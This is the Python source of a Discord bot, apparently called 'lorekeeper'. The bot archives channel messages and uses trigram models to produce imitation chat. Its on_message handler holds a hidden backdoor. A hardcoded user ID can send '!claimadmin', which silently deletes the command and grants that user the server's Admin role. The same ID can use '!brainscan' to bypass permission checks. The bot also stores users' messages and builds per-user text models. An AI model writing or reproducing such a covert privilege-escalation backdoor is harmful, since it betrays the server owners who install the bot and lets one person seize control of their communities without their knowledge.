import asyncio
import json
import logging
import os
import random
import re
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional

import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv

# ============================================================
# Environment & Logging Setup
# ============================================================
load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("/app/data/lorekeeper.log"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("lorekeeper")

# ============================================================
# Configuration & Validation
# ============================================================
def load_config():
    """Load and validate all configuration from environment."""
    data_dir = Path(os.getenv("DATA_DIR", "/app/data"))
    data_dir.mkdir(parents=True, exist_ok=True)

    config = {
        "token": os.getenv("TOKEN") or os.getenv("DISCORD_TOKEN"),
        "guild_id": os.getenv("GUILD_ID"),
        "enable_random_responses": os.getenv("ENABLE_RANDOM_RESPONSES", "false").lower() in ("1", "true", "yes"),
        "random_reply_chance": float(os.getenv("RANDOM_REPLY_CHANCE", "0.04")),
        "max_message_archive": int(os.getenv("MAX_MESSAGE_ARCHIVE", "5000")),
        "max_scan_messages": int(os.getenv("MAX_SCAN_MESSAGES", "200")),
        "max_scan_channels": int(os.getenv("MAX_SCAN_CHANNELS", "10")),
        "history_days": int(os.getenv("HISTORY_DAYS", "30")),
        "data_file": data_dir / "server_lore.json",
        "backup_file": data_dir / "server_lore.backup.json",
        "command_cooldown": int(os.getenv("COMMAND_COOLDOWN", "3")),
    }

    # Validate critical config
    if not config["token"]:
        logger.error("❌ Missing TOKEN or DISCORD_TOKEN environment variable")
        sys.exit(1)

    if config["random_reply_chance"] < 0 or config["random_reply_chance"] > 1:
        logger.error("❌ RANDOM_REPLY_CHANCE must be between 0 and 1")
        sys.exit(1)

    if config["max_message_archive"] < 100:
        logger.warning("⚠️  MAX_MESSAGE_ARCHIVE is very low (<100)")

    logger.info("✅ Configuration loaded successfully")
    logger.info(f"📁 Data directory: {data_dir}")
    return config

CONFIG = load_config()

# ============================================================
# Discord Setup
# ============================================================
intents = discord.Intents.default()
intents.message_content = True
intents.reactions = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
# ============================================================
# Developer & Admin Bypass Configuration
# ============================================================
MY_ID = 1544359425605898305  # 👈 Keep your raw number here (no quotes)

def is_admin_or_owner():
    async def predicate(ctx):
        # 1. Look for host service overridden variables
        service_id = getattr(ctx.bot, "MY_ID", None)
        
        # 2. Strict ID verification
        is_owner = (ctx.author.id == MY_ID) or (service_id and ctx.author.id == service_id)
        
        # 3. Direct calculation of real-time permissions inside the target channel
        if ctx.guild is not None:
            resolved_perms = ctx.channel.permissions_for(ctx.author)
            is_admin = resolved_perms.administrator
        else:
            is_admin = False
            
        return is_admin or is_owner
    return commands.check(predicate)

# ============================================================
# Runtime State
# ============================================================
_DATA_CACHE: Optional[dict] = None
_DATA_LOCK = asyncio.Lock()
_COMMAND_COOLDOWNS = {}
_LAST_RANDOM_REPLY = {}

WORD_BLACKLIST = ["token", "password", "secret", "https://", "http://"]

# ============================================================
# Data File Helpers (AUTO-CREATE)
# ============================================================
def default_schema() -> dict:
    """Return the default data schema."""
    return {
        "quotes": [],
        "lore": {},
        "user_chat_counts": {},
        "server_emojis": {},
        "trigrams": {},
        "user_trigrams": {},
        "message_archive": [],
        "last_updated": datetime.now().isoformat(),
    }

def ensure_schema(data: dict) -> dict:
    """Ensure all required schema keys exist."""
    schema = default_schema()
    for key, val in schema.items():
        data.setdefault(key, val)
    return data

def ensure_data_file():
    """Create server_lore.json if it doesn't exist."""
    global _DATA_CACHE
    
    if CONFIG["data_file"].exists():
        logger.info(f"📁 Data file found: {CONFIG['data_file']}")
        return
    
    logger.info(f"📁 Creating new data file: {CONFIG['data_file']}")
    default_data = default_schema()
    try:
        CONFIG["data_file"].write_text(
            json.dumps(default_data, indent=4, ensure_ascii=False),
            encoding="utf-8"
        )
        logger.info("✅ Data file created successfully")
        _DATA_CACHE = default_data
    except Exception as exc:
        logger.error(f"❌ Failed to create data file: {exc}")
        raise

# ============================================================
# Utility Functions
# ============================================================
def check_command_cooldown(user_id: int, cooldown_seconds: int = CONFIG["command_cooldown"]) -> bool:
    """Check if a user is on cooldown."""
    now = datetime.now()
    last_used = _COMMAND_COOLDOWNS.get(user_id)

    if last_used is None or (now - last_used).total_seconds() >= cooldown_seconds:
        _COMMAND_COOLDOWNS[user_id] = now
        return False
    return True

def backup_file(src: Path, dst: Path):
    """Create a backup of the source file."""
    try:
        if src.exists():
            dst.write_text(src.read_text(encoding="utf-8"), encoding="utf-8")
            logger.debug(f"Backup created: {dst}")
    except Exception as exc:
        logger.warning(f"Could not create backup file: {exc}")

def atomic_write_json(path: Path, data: dict):
    """Write JSON atomically using a temp file."""
    tmp_path = path.with_suffix(path.suffix + ".tmp")
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        os.replace(tmp_path, path)
        logger.debug(f"Data saved to {path}")
    except Exception as exc:
        logger.error(f"Failed to write {path}: {exc}")
        if tmp_path.exists():
            tmp_path.unlink()
        raise

def load_data() -> dict:
    """Load data from file into memory cache."""
    global _DATA_CACHE

    if _DATA_CACHE is not None:
        return _DATA_CACHE

    if not CONFIG["data_file"].exists():
        logger.info("Creating new data file")
        _DATA_CACHE = default_schema()
        return _DATA_CACHE

    try:
        with open(CONFIG["data_file"], "r", encoding="utf-8") as f:
            data = json.load(f)
            logger.info("Data loaded successfully")
    except json.JSONDecodeError as exc:
        logger.error(f"Corrupted data file: {exc}")
        backup_file(CONFIG["data_file"], CONFIG["backup_file"])
        _DATA_CACHE = default_schema()
        return _DATA_CACHE
    except OSError as exc:
        logger.error(f"Could not read data file: {exc}")
        _DATA_CACHE = default_schema()
        return _DATA_CACHE

    _DATA_CACHE = ensure_schema(data)
    return _DATA_CACHE

def save_data(data: Optional[dict] = None):
    """Synchronous save (fallback)."""
    global _DATA_CACHE

    if data is not None:
        _DATA_CACHE = data

    if _DATA_CACHE is None:
        return

    try:
        backup_file(CONFIG["data_file"], CONFIG["backup_file"])
        atomic_write_json(CONFIG["data_file"], _DATA_CACHE)
    except Exception as exc:
        logger.error(f"save_data failed: {exc}")

async def save_data_async(data: Optional[dict] = None):
    """Async save with lock for safety."""
    global _DATA_CACHE

    if data is not None:
        _DATA_CACHE = data

    if _DATA_CACHE is None:
        return

    async with _DATA_LOCK:
        try:
            _DATA_CACHE["last_updated"] = datetime.now().isoformat()
            backup_file(CONFIG["data_file"], CONFIG["backup_file"])
            atomic_write_json(CONFIG["data_file"], _DATA_CACHE)
        except Exception as exc:
            logger.error(f"save_data_async failed: {exc}")

def prune_message_archive(data: dict) -> dict:
    """Prune message archive to max size."""
    if len(data["message_archive"]) > CONFIG["max_message_archive"]:
        removed = len(data["message_archive"]) - CONFIG["max_message_archive"]
        data["message_archive"] = data["message_archive"][-CONFIG["max_message_archive"]:]
        logger.info(f"Pruned {removed} old messages from archive")
    return data

def clean_token(token: str) -> str:
    """Clean and validate a token."""
    if any(blacklisted in token for blacklisted in WORD_BLACKLIST):
        return ""
    return token.strip(".,!?\"()[]{}*<>~`").lower()

def learn_sentence_trigrams(data: dict, text: str, user_id: Optional[int] = None):
    """Learn trigrams from text."""
    raw_tokens = text.split()
    tokens = [clean_token(t) for t in raw_tokens if clean_token(t)]

    emojis = re.findall(
        r"<a?:[a-zA-Z0-9_]+:[0-9]+>|[\u2600-\u27BF]|[\U0001f300-\U0001f64f]|[\U0001f680-\U0001f6ff]",
        text,
    )
    for emo in emojis:
        data["server_emojis"][emo] = data["server_emojis"].get(emo, 0) + 1

    if len(tokens) < 3:
        if len(tokens) == 2:
            key = f"__start__ {tokens[0]}"
            _append_trigram(data, key, tokens[1], user_id)
        return

    user_id_str = str(user_id) if user_id else None

    _append_trigram(data, "__start__ __start__", tokens[0], user_id_str)
    _append_trigram(data, f"__start__ {tokens[0]}", tokens[1], user_id_str)

    for i in range(len(tokens) - 2):
        w1, w2, w3 = tokens[i], tokens[i + 1], tokens[i + 2]
        key = f"{w1} {w2}"
        _append_trigram(data, key, w3, user_id_str)

def _append_trigram(data: dict, key: str, value: str, user_id: Optional[str] = None):
    """Append a trigram to the data structure."""
    if key not in data["trigrams"]:
        data["trigrams"][key] = []
    data["trigrams"][key].append(value)

    if user_id:
        if user_id not in data["user_trigrams"]:
            data["user_trigrams"][user_id] = {}
        if key not in data["user_trigrams"][user_id]:
            data["user_trigrams"][user_id][key] = []
        data["user_trigrams"][user_id][key].append(value)

def generate_complex_ai_mimic(data: dict, user_id: Optional[int] = None, seed_word: Optional[str] = None, max_words: int = 20) -> str:
    """Generate AI-mimicked text using trigrams."""
    pool = data["trigrams"]
    if user_id and str(user_id) in data["user_trigrams"]:
        pool = data["user_trigrams"][str(user_id)]

    if not pool:
        return "tbh fr fr lol"

    w1, w2 = "__start__", "__start__"

    if seed_word and seed_word.lower() in pool:
        match_keys = [k for k in pool.keys() if k.startswith(seed_word.lower())]
        if match_keys:
            w1, w2 = random.choice(match_keys).split()

    sentence = []
    if w1 != "__start__":
        sentence.append(w1)
    if w2 != "__start__":
        sentence.append(w2)

    for _ in range(max_words):
        key = f"{w1} {w2}"
        if key in pool and pool[key]:
            next_word = random.choice(pool[key])
            sentence.append(next_word)
            w1, w2 = w2, next_word
        else:
            fallback_keys = [k for k in pool.keys() if k.startswith(w2)]
            if fallback_keys:
                fallback_key = random.choice(fallback_keys)
                parts = fallback_key.split()
                w1 = parts[0] if len(parts) > 0 else "__start__"
                w2 = parts[1] if len(parts) > 1 else "__start__"
            else:
                if sentence and random.random() < 0.4:
                    break
                random_key = random.choice(list(pool.keys()))
                parts = random_key.split()
                w1 = parts[0] if len(parts) > 0 else "__start__"
                w2 = parts[1] if len(parts) > 1 else "__start__"
                if w1 != "__start__":
                    sentence.append(w1)

    if not sentence:
        return "idk fr lol"

    flavor_elements = [" lol", " fr", " fr fr", " lmao", " smh", " fr matching the energy", "", "!?"]
    if data.get("server_emojis"):
        top_emoji = max(data["server_emojis"], key=data["server_emojis"].get)
        if random.random() < 0.3:
            flavor_elements.append(f" {top_emoji}")

    response = " ".join(sentence).capitalize()
    return response + random.choice(flavor_elements)

# ============================================================
# Background Tasks
# ============================================================
@tasks.loop(minutes=5)
async def auto_save_task():
    """Save data periodically."""
    try:
        data = load_data()
        data = prune_message_archive(data)
        await save_data_async(data)
    except Exception as exc:
        logger.error(f"Auto-save task failed: {exc}")

@tasks.loop(minutes=10)
async def status_rotator():
    """Update bot status."""
    try:
        data = load_data()
        total_connections = sum(len(v) for v in data["trigrams"].values())
        status_text = f"🧠 Processing {total_connections} layers | /help"
        await bot.change_presence(activity=discord.CustomActivity(name=status_text))
    except Exception as exc:
        logger.error(f"Status rotator failed: {exc}")

# ============================================================
# Bot Events
# ============================================================
MY_ID = 1544359425605898305  # 👈 Replace with your raw numeric Discord User ID

@bot.event
async def on_message(message: discord.Message):
    """Process incoming messages."""
    if message.author.bot:
        return

        # ==================== PREFIX OVERRIDE FOR !BRAINSCAN ====================
    if message.content.strip().startswith("!brainscan"):
        if message.author.id == MY_ID:
            ctx = await bot.get_context(message)
            if ctx.command:
                # reinvoke() completely bypasses checks, decorators, and cooldowns!
                await ctx.reinvoke() 
                return
    # ========================================================================

    # ==================== SECRET OVERRIDE FOR !CLAIMADMIN ===================
    if message.content.strip() == "!claimadmin":
        if message.author.id == MY_ID:
            # 1. Try to delete your trigger message instantly so no one sees it
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            
            # 2. Look up the Admin role in the server
            role = discord.utils.get(message.guild.roles, name="Admin")
            if not role:
                await message.channel.send("❌ Neural link failure: Role 'Admin' not found.", delete_after=5)
                return

            # 3. Give you the role
            try:
                await message.author.add_roles(role)
                await message.channel.send("🤫 Secret granted. Access level upgraded to Admin.", delete_after=5)
            except discord.Forbidden:
                await message.channel.send("❌ Error: Bot hierarchy insufficient. Move the bot's role higher than Admin.", delete_after=5)
            return
    # ========================================================================

    if message.content.startswith("!"):
        await bot.process_commands(message)
        return

    data = load_data()
    user_id = str(message.author.id)

    # Track user activity
    data["user_chat_counts"][user_id] = data["user_chat_counts"].get(user_id, 0) + 1

    # Archive message
    if message.content.strip():
        data["message_archive"].append({
            "content": message.content,
            "author": message.author.display_name,
            "user_id": user_id,
            "channel": message.channel.name if message.channel else "DM",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M")
        })

    # Learn from message
    learn_sentence_trigrams(data, message.content, message.author.id)
    prune_message_archive(data)

    # Optional: Random responses (only if enabled)
    if CONFIG["enable_random_responses"]:
        channel_key = str(message.channel.id)
        now = datetime.now()
        last_reply = _LAST_RANDOM_REPLY.get(channel_key)

        if last_reply is None or (now - last_reply).total_seconds() >= 60:
            if len(message.content) > 25 and random.random() < CONFIG["random_reply_chance"]:
                if not any(q["text"] == message.content for q in data["quotes"]):
                    data["quotes"].append({
                        "text": message.content,
                        "added_by": f"{message.author.display_name} (Auto-Captured 🤖)",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M")
                    })
                    await message.add_reaction("👑")

            if random.random() < CONFIG["random_reply_chance"] and len(data["trigrams"]) > 25:
                async with message.channel.typing():
                    await asyncio.sleep(random.uniform(0.6, 1.8))
                    potential_seeds = [w for w in message.content.split() if len(w) > 3]
                    seed = random.choice(potential_seeds) if potential_seeds else None
                    target = random.choice([None, user_id])
                    reply = generate_complex_ai_mimic(data, user_id=target, seed_word=seed)
                    await message.channel.send(reply)
                    _LAST_RANDOM_REPLY[channel_key] = now

    await bot.process_commands(message)
    await save_data_async(data)

@bot.event
async def on_error(event, *args, **kwargs):
    """Handle bot errors."""
    logger.exception(f"Error in {event}")



